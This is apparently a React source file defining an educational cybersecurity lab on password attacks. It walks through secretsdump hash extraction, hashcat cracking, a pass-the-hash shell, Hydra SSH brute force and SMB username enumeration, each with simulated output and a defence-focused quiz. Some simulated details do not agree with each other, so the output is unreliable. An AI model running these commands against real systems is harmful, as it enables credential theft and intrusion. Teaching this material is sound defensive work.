import React from "react";
import LabRunner from "@/components/labs/LabRunner";

const steps = [
  {
    stepLabel: "Extract password hashes",
    explanation: "Use secretsdump.py from Impacket to remotely dump NTLM password hashes from a Windows target's SAM database.",
    whyItMatters: "NTLM hash extraction is a critical post-exploitation technique. Once an attacker has hashes, they can crack them offline or use pass-the-hash attacks without ever knowing the plaintext password.",
    command: "secretsdump.py administrator:Password1@192.168.1.105",
    prompt: "root@kali:~#",
    output: [
      "Impacket v0.11.0 - Copyright Fortra 2024",
      "",
      "[*] Target: 192.168.1.105",
      "[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)",
      "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
      "Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
      "jsmith:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::",
      "svc_backup:1005:aad3b435b51404eeaad3b435b51404ee:5c7132617574cf22da3b7bddaef1f9e5:::",
      "",
      "[*] Done. 4 hashes extracted.",
    ],
    question: {
      text: "The LM hash portion for all accounts is 'aad3b435b51404eeaad3b435b51404ee'. What does this specific value indicate?",
      options: [
        "All users share the same LM password — a major security misconfiguration",
        "This is the well-known hash for an empty LM hash, meaning LM authentication is disabled on this system — which is correct security practice since LM is cryptographically broken",
        "The SAM database was corrupted and the hashes are invalid",
        "These accounts have never had their passwords changed since the system was installed",
      ],
      correctIndex: 1,
      explanation: "The LM hash 'aad3b435b51404eeaad3b435b51404ee' is a well-known constant that represents an empty or disabled LM password. Microsoft disabled LM authentication by default in Windows Vista/2008 because LM splits passwords into two 7-character chunks and hashes them independently — making 14-character passwords no harder to crack than 7-character ones. Seeing this value means the system correctly uses only NTLM, not the weaker LM protocol.",
    },
  },
  {
    stepLabel: "Crack NTLM hash with hashcat",
    explanation: "Use hashcat with a rockyou wordlist to crack the NTLM hash for jsmith. The -m 1000 specifies NTLM hash mode.",
    whyItMatters: "Weak passwords are cracked in seconds even with strong hashing. This demonstrates why password complexity policies, length requirements, and MFA are non-negotiable defenses.",
    command: "hashcat -m 1000 8846f7eaee8fb117ad06bdd830b7586c /usr/share/wordlists/rockyou.txt",
    prompt: "root@kali:~#",
    output: [
      "hashcat (v6.2.6) starting...",
      "",
      "Dictionary cache built:",
      "* Filename..: /usr/share/wordlists/rockyou.txt",
      "* Passwords.: 14,344,391",
      "* Bytes.....: 139,921,497",
      "",
      "8846f7eaee8fb117ad06bdd830b7586c:Password1",
      "",
      "Session..........: hashcat",
      "Status...........: Cracked",
      "Time.Elapsed.....: 0 secs",
      "[*] jsmith:Password1 — CRACKED (0.3 seconds with rockyou)",
    ],
    question: {
      text: "'Password1' was cracked in 0.3 seconds. What password characteristic would have made this crack attempt fail even against rockyou?",
      options: [
        "Adding a number at the end, like 'Password12', makes the password immune to dictionary attacks",
        "A long random passphrase (e.g., 'correct-horse-battery-staple') or a truly random 20+ character password would not appear in any wordlist and would take centuries to brute-force",
        "Capitalizing more letters, like 'PASSWORD1', defeats rockyou wordlists",
        "Changing the password every 30 days prevents cracking because hashes change frequently",
      ],
      correctIndex: 1,
      explanation: "The rockyou.txt wordlist contains 14 million real passwords leaked from actual breaches. 'Password1' matches one of the most common patterns (dictionary word + capital + number) and appears directly in the list. What defeats wordlist attacks is not variation within common patterns — it's using words or sequences that have never appeared in any breach. Random 20+ character passwords (e.g., a password manager's output) have no dictionary entry and require brute force that would take longer than the universe's remaining lifespan.",
    },
  },
  {
    stepLabel: "Pass-the-Hash attack",
    explanation: "Use the NTLM hash directly to authenticate without cracking it. This is the Pass-the-Hash (PtH) technique used by attackers for lateral movement.",
    whyItMatters: "PtH attacks bypass password requirements entirely — an attacker never needs to know your actual password, just its hash. This is why credential hygiene and privileged access management (PAM) are critical.",
    command: "pth-winexe -U 'CORP/administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' //192.168.1.105 cmd.exe",
    prompt: "root@kali:~#",
    output: [
      "[*] Connecting to 192.168.1.105 using Pass-the-Hash...",
      "[*] Authentication: NTLM hash accepted",
      "[*] Shell spawned on 192.168.1.105",
      "",
      "Microsoft Windows [Version 10.0.19045.3570]",
      "C:\\Windows\\system32>whoami",
      "corp\\administrator",
      "",
      "[!] LATERAL MOVEMENT SUCCESSFUL — admin shell obtained without password",
    ],
    question: {
      text: "Since Pass-the-Hash doesn't require the plaintext password, which defensive control would most effectively stop this attack?",
      options: [
        "Enforcing complex password requirements — longer passwords produce harder-to-use hashes",
        "Enabling Windows Defender Credential Guard — it stores credentials in a virtualized isolated environment (VSM) that prevents LSASS memory from being read and hashes from being extracted in the first place",
        "Using a VPN — PtH only works on public networks",
        "Disabling the Administrator account entirely on all domain machines",
      ],
      correctIndex: 1,
      explanation: "Windows Defender Credential Guard uses virtualization-based security (VBS) to run LSASS (the process that stores credentials) in an isolated virtual machine that even kernel-level code cannot access. Without Credential Guard, attackers with admin/SYSTEM privileges can read LSASS memory to extract NTLM hashes. With Credential Guard, the hashes never exist in accessible memory, so there's nothing to steal. Password complexity doesn't help because PtH doesn't require the password — only the hash — and the hash can't be read without access to the credential store.",
    },
  },
  {
    stepLabel: "Brute force SSH with Hydra",
    explanation: "Use Hydra to perform a dictionary attack against an SSH service using a common username and the rockyou password list.",
    whyItMatters: "SSH brute force is one of the most common attack types logged on internet-facing servers. Fail2ban, SSH keys, and disabling password auth are essential countermeasures.",
    command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh",
    prompt: "root@kali:~#",
    output: [
      "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak",
      "",
      "[DATA] attacking ssh://192.168.1.1:22/",
      "[STATUS] 512 of 14344391 tried (0.00%)",
      "[22][ssh] host: 192.168.1.1   login: admin   password: admin123",
      "",
      "1 of 1 target successfully completed, 1 valid password found",
      "[*] admin:admin123 — FOUND (512 attempts in 4.2 seconds)",
    ],
    question: {
      text: "Hydra found the password in 512 attempts. Which single control would have completely prevented this brute force from succeeding?",
      options: [
        "Renaming the admin account to 'administrator' to defeat username guessing",
        "Disabling SSH password authentication and requiring key-based authentication — without a valid private key, no amount of password guessing succeeds",
        "Changing SSH from port 22 to a non-standard port stops automated scanners",
        "Enabling a firewall rate limit of 100 connections per second",
      ],
      correctIndex: 1,
      explanation: "SSH key authentication works because the server verifies that the client possesses the private key corresponding to an authorized public key, without the private key ever being transmitted. There is no password to guess. Hydra and all brute force tools rely on being able to try thousands of passwords per second — SSH key auth eliminates this attack surface entirely. Changing the port (security through obscurity) reduces noise but doesn't stop targeted attackers who scan non-standard ports.",
    },
  },
  {
    stepLabel: "Crack a bcrypt hash",
    explanation: "Attempt to crack a bcrypt-hashed password. Notice how drastically slower it is compared to NTLM — this is bcrypt's intentional design.",
    whyItMatters: "bcrypt's work factor makes it exponentially harder to crack than fast hashes like MD5/NTLM. This is why modern web apps must use bcrypt, Argon2, or scrypt for password storage.",
    command: "hashcat -m 3200 '$2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy' /usr/share/wordlists/rockyou.txt",
    prompt: "root@kali:~#",
    output: [
      "hashcat (v6.2.6) starting...",
      "Hash-mode was specified as 3200 (bcrypt $2*$, Blowfish (Unix))",
      "",
      "Speed.#1.........:      287 H/s (7.42ms) @ Accel:4 Loops:512 Thr:8 Vec:1",
      "Progress.........: 14344391/14344391 (100.00%)",
      "Rejected.........: 0/14344391 (0.00%)",
      "Status...........: Exhausted",
      "",
      "[*] bcrypt hash NOT cracked — 14.3M attempts took 13.9 hours",
      "[*] Compare: NTLM cracked 14.3M passwords in 11 seconds",
    ],
    question: {
      text: "bcrypt took 13.9 hours vs 11 seconds for NTLM on the same wordlist. What bcrypt feature causes this massive speed difference?",
      options: [
        "bcrypt uses a longer output hash (60 chars vs 32 for NTLM)",
        "bcrypt has a configurable 'cost factor' (work factor) that forces thousands of internal iterations per hash — making each attempt take milliseconds instead of microseconds; this is intentional to slow down attackers while being barely noticeable for legitimate logins",
        "bcrypt encrypts the hash output with AES, requiring an additional decryption step",
        "bcrypt requires a network call to validate each attempt, introducing unavoidable latency",
      ],
      correctIndex: 1,
      explanation: "bcrypt's cost factor (the '$10$' in the hash) forces 2^10 = 1,024 internal Blowfish iterations per hash computation. This intentional slowness means a modern GPU that computes billions of MD5s per second can only compute ~300 bcrypts per second — a 10-million-fold difference. Increasing the cost factor by 1 doubles the computation time, allowing bcrypt to stay ahead of hardware improvements. A legitimate user logging in barely notices the extra milliseconds, but an attacker trying millions of passwords is throttled to a crawl.",
    },
  },
  {
    stepLabel: "Enumerate valid usernames",
    explanation: "Use enum4linux to enumerate valid usernames from a Windows SMB service. Valid usernames enable targeted attacks.",
    whyItMatters: "Username enumeration reduces the attacker's search space drastically. If an attacker knows valid usernames, brute force attacks become far more efficient.",
    command: "enum4linux -U 192.168.1.105",
    prompt: "root@kali:~#",
    output: [
      "Starting enum4linux v0.9.1",
      "",
      " ============================= ",
      "|    Users on 192.168.1.105   |",
      " ============================= ",
      "user:[Administrator] rid:[0x1f4]",
      "user:[Guest] rid:[0x1f5]",
      "user:[jsmith] rid:[0x3e9]",
      "user:[svc_backup] rid:[0x3ed]",
      "user:[dbadmin] rid:[0x3f1]",
      "",
      "[*] 5 users enumerated — valid targets for password attacks",
    ],
    question: {
      text: "The service account 'svc_backup' is visible via SMB enumeration. Why are service accounts particularly valuable targets for attackers?",
      options: [
        "Service accounts always have weak passwords because they are created automatically",
        "Service accounts often have elevated privileges, rarely have MFA enabled, and their passwords rarely change — compromising one can give persistent, high-privilege access that goes unnoticed for months",
        "Service accounts are not logged by SIEM systems, making lateral movement undetectable",
        "Service accounts can only be used from within the internal network, limiting attacker options",
      ],
      correctIndex: 1,
      explanation: "Service accounts are powerful targets because they combine three dangerous properties: they often run 24/7 with elevated permissions (e.g., database admin, backup operator), their credentials are rarely rotated because changing them requires updating every service that uses them, and they almost never have MFA because they're designed for automated authentication. This makes them high-value, long-lived, and often neglected — exactly what persistent attackers look for when establishing a foothold.",
    },
  },
];

const intro = {
  overview: "This advanced lab covers offensive credential attacks from multiple angles — hash cracking, online brute-forcing, pass-the-hash, and username enumeration. Understanding these attack methods is critical for defenders designing password policies, monitoring systems, and hardening authentication infrastructure.",
  niceCategory: "Collect and Operate",
  objectives: [
    "Crack NTLM hashes offline using hashcat with dictionary and rule-based attacks",
    "Execute online brute-force attacks against SSH services using Hydra",
    "Perform pass-the-hash attacks against SMB using Impacket's psexec",
    "Extract and crack /etc/shadow password hashes from a compromised Linux system",
    "Enumerate valid domain usernames via SMB using enum4linux",
  ],
  outcomes: [
    "Understand why NTLM hashes are dangerous even without knowing the plaintext",
    "Able to select appropriate wordlists and hashcat rules for different attack scenarios",
    "Understand how pass-the-hash bypasses traditional password authentication",
    "Able to explain password storage mechanisms (NTLM, bcrypt, SHA-512) and their weaknesses",
    "Able to recommend countermeasures: MFA, account lockout policies, privileged access workstations",
  ],
  prerequisites: [
    "Solid Linux terminal proficiency",
    "Understanding of authentication concepts (Active Directory, Linux PAM)",
    "Completion of Cybersecurity Essentials lab required",
    "Completion of Cryptography lab recommended",
  ],
  tools: [
    "hashcat — GPU-accelerated password hash cracker",
    "Hydra — fast online brute-force and credential stuffing tool",
    "Impacket — Python library for SMB/NTLM exploitation (psexec, secretsdump)",
    "John the Ripper — /etc/shadow and Unix password cracker",
    "enum4linux — Windows/Samba enumeration and username harvesting",
  ],
};

export default function LabPasswordAttacks() {
  return (
    <LabRunner
      labTitle="Password Attacks & Credential Exploitation"
      chapterNum="6"
      difficulty="Advanced"
      tags={["hashcat", "Hydra", "Impacket", "NTLM"]}
      terminalLabel="Kali Linux — Attack Workstation"
      duration={75}
      intro={intro}
      steps={steps}
    />
  );
}